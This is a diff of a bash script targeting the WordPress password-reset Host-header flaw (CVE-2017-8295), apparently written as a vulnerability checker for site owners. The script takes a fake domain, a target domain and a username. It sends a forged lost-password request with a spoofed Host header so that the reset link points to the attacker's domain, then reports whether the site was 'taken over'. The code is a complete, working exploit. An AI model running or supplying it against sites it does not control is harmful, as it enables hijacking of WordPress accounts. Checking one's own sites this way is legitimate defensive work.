@@ -18,7 +18,8 @@
 # Author: Steve Grunwell (https://stevegrunwell.com)
 # Link: https://stevegrunwell.com/blog/keeping-wordpress-secure/
 # License: MIT
-
+#
+# tag::wp_2017-8295[]
 FAKE_DOMAIN=$1
 DOMAIN=$2
 USERNAME=$3
@@ -26,17 +27,24 @@ USERNAME=$3
 echo -e "\nAttempting to reset the password for '$USERNAME' on $DOMAIN:";
 
 RESPONSE=$(curl --write-out %{http_code} --silent --output /dev/null \
-	-X POST "$DOMAIN/wp-login.php?action=lostpassword" \
+	-X POST "http://$DOMAIN/wp-login.php?action=lostpassword" \
   -H 'cache-control: no-cache' \
   -H 'content-type: application/x-www-form-urlencoded' \
   -H "host: $FAKE_DOMAIN" \
   -H "origin: $DOMAIN" \
   -H "referer: $DOMAIN/wp-login.php?action=lostpassword" \
-  -d user_login=$USERNAME&redirect_to=&wp-submit=Get+New+Password)
+  -d user_login=$USERNAME \
+	-d redirect_to= \
+	-d wp-submit=Get+New+Password)
 
 # A 302 response indicates the user was redirected to the confirmation screen.
 if [ "$RESPONSE" == "302" ]; then
   echo -e "> Uh yeah, it appears that we took over $DOMAIN.\n"
 else
-	echo -e "> Good news! $DOMAIN appears to be safe from this exploit.\n"
+	if [ "$RESPONSE" == "500" ]; then
+	  echo -e "> Uh yeah, it appears that we took over $DOMAIN, but the mailing seems to be not configured.\n"
+	else
+		echo -e "> $RESPONSE: Good news! $DOMAIN appears to be safe from this exploit.\n"
+	fi
 fi
+# end::wp_2017-8295[]
